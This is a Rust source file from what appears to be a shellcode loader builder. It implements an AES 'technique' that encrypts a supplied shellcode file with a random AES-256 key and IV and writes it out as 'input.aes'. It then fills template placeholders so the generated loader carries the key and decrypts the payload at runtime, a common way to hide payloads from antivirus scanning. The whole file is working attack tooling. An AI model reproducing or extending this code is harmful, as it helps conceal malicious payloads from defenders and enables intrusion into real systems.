use crate::techniques::{BuildContext, Technique, TechniqueMeta};
use crate::tools::{random_aes_iv, random_aes_key};
use libaes::Cipher;
use std::fs;

pub struct Aes;

impl Technique for Aes {
    fn meta(&self) -> &'static TechniqueMeta { &AES_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        let key = random_aes_key();
        let iv = random_aes_iv();
        let shellcode = fs::read(ctx.shellcode_path)
            .map_err(|e| anyhow::anyhow!("read shellcode: {e}"))?;
        let cipher = Cipher::new_256(&key);
        let encrypted = cipher.cbc_encrypt(&iv, &shellcode);

        let out_path = ctx.src_dir.join("input.aes");
        fs::write(&out_path, &encrypted)
            .map_err(|e| anyhow::anyhow!("write input.aes: {e}"))?;

        ctx.set_replacement("{{PATH_TO_SHELLCODE}}", "\"input.aes\"".to_string());
        ctx.set_replacement("{{DECRYPTION_FUNCTION}}",
            "fn aes_256_decrypt(buf: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> { let cipher = Cipher::new_256(key); cipher.cbc_decrypt(iv, buf) }".to_string());
        ctx.set_replacement("{{MAIN}}", format!(
            "let key: [u8;32] = {:?};\n    let iv: [u8;16] = {:?};\n    vec = aes_256_decrypt(&vec, &key, &iv);", key, iv
        ));
        ctx.set_replacement("{{DEPENDENCIES}}", r#"libaes = "0.7""#.to_string());
        ctx.set_replacement("{{IMPORTS}}", "use libaes::Cipher;".to_string());
        Ok(())
    }
}

pub use super::super::AES_META;
